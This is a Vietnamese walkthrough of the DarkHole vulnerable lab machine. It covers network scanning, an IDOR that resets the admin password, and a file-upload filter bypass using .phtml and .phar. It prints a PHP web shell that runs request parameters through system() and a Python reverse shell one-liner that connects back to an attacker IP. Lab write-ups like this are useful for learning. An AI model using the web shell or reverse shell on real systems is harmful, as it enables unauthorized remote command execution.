## Step 1
Dùng netdiscover để quét ip của máy victim ->192.168.77.251

![image](https://user-images.githubusercontent.com/97771705/224999146-d497a7b0-aa8c-44f6-afe7-c85b530bd6be.png)

Dùng nmap để quét các port tồn tại

![image](https://user-images.githubusercontent.com/97771705/224999373-f0a6423c-cfef-4f3c-8a66-f9a8722a765d.png)

Truy cập vào web darkhole

![image](https://user-images.githubusercontent.com/97771705/224999560-99cd293f-10cf-49ee-843a-a0a54dacaf31.png)

Sử dụng dirsearch, tìm thấy khá nhiều trang thú vị

![image](https://user-images.githubusercontent.com/97771705/225000326-d0af62cb-bf0d-4e34-82d0-019fa00e48e1.png)

Trang config có database.php!! -> truy cập thử nhưng không được :(

![image](https://user-images.githubusercontent.com/97771705/225001082-87b52dc9-9324-49e6-90b7-c5d8c384e3a9.png)

Quay lại trang register và login. Thử IDOR nhưng đã bị chặn

![image](https://user-images.githubusercontent.com/97771705/225001864-2588ea8b-0426-4e95-9922-5c632c07a6cb.png)

![image](https://user-images.githubusercontent.com/97771705/225001912-6d662cb8-a628-4339-beef-5d0f605ec881.png)

Thử change password. Tại burp sửa đổi sang id = 1 vẫn thành công

![image](https://user-images.githubusercontent.com/97771705/225002475-75014042-364e-436e-a72c-282b22621f71.png)

Đoán id=1 chính là admin, đăng nhập thử admin/456 -> vào được trang admin

![image](https://user-images.githubusercontent.com/97771705/225002725-e7d84d51-df93-4dcd-8154-92d8946a66c1.png)

## Step 2
Chức năng upload file chỉ cho phép upload định dạng jpg, png, gif

![image](https://user-images.githubusercontent.com/97771705/225003170-d488cebb-dd45-455f-8528-49504a606f44.png)

Tạo 1 file simple backdoor như sau 
```
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
```

Lưu nó lại với tên backdoor.txt

Thử upload file và nhờ burp sửa đuôi sang php4,php5.... -> chỉ có đuôi phtml là có thể thực thi được php 

![image](https://user-images.githubusercontent.com/97771705/225006690-595521b6-c1bd-4982-8377-65e21d6ad5f9.png)

Ngoài ra file .phar cũng xài được :)

![image](https://user-images.githubusercontent.com/97771705/225007577-ea4ea1e5-0806-427f-a501-e3026a6ab651.png)

Bắt đầu reverse shell : Sử dụng payload kiếm được trên https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python

> python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.77.128",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

Máy parrot nhập command nc -nlvp 4444, sau đó nhaapm reverse shell trên lên url

![image](https://user-images.githubusercontent.com/97771705/225012793-9b45c432-dc42-4734-a754-8b7606677afd.png)


![image](https://user-images.githubusercontent.com/97771705/225012728-786a9ddf-160b-40e5-b089-e14d2d70cdf4.png)

Kết quả: 

![image](https://user-images.githubusercontent.com/97771705/225013005-e82b7184-424c-4aaa-a84b-02c342d90d31.png)



